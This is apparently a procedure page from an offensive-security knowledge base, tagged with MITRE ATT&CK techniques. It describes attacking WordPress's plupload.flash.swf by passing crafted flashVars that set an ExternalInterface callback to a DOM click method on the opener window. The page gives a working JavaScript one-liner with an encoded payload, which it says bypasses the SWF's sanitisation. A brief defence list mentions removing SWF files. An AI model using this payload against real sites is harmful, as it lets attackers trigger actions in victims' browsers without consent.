---
id: proc-open-swf
tags:
  - flash
  - some
  - payload
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2024-01-01T00:00:00Z'
techniques:
  - '[[Exploitation for Client Execution]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:23:53.907Z'
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
  - '[[JavaScript]]'
---
# Open-SWF-Window-with-Crafted-Payload

## Summary

Load the plupload.flash.swf in a new window using encoded parameters to inject malicious flashVars for ExternalInterface callbacks.

## Description

The new window's location is set to the SWF URL with payload '%#target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&', evading the 'GET Killer' sanitization in the SWF's URL handling.

## Requirements

1. Victim's browser supports Flash
2. Access to WordPress SWF path
3. Encoded payload ready

## Defense

Defensive measures and detection strategies:

- Remove or disable SWF files
- Use [[commands/apache-force-swf-download]] to force downloads
- Flash deprecation in modern browsers

## Objectives

1. Load SWF with unsanitized params
2. Set target callback to DOM method
3. Prepare for cross-window execution

## Instructions

### Step 1: Set Window Location with Payload

**Context**: Use setTimeout to assign the SWF URL with encoded query.

**Command** (JavaScript):
```javascript
setTimeout(function() { w.location = 'http://target.com/wp-includes/js/plupload/plupload.flash.swf?%#target%g=opener.document.body.firstElementChild.nextElementSibling.nextElementSibling.nextElementSibling.firstElementChild.click&uid%g=hello&'; }, 100);
```

> SWF loads. Expected output: Flash content initializes with flashVars set.

### Step 2: Verify Parameter Injection

**Context**: Ensure bypass of Utils.sanitize in SWF.

**Command** (No direct command; observe in dev tools):
```javascript
// Payload sets eventDispatcher and event strings
```

> Parameters persist. Expected output: No sanitization errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Software
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/apache-force-swf-download]]

## Tools Used


## Tags

- [[flash]]
- [[some]]
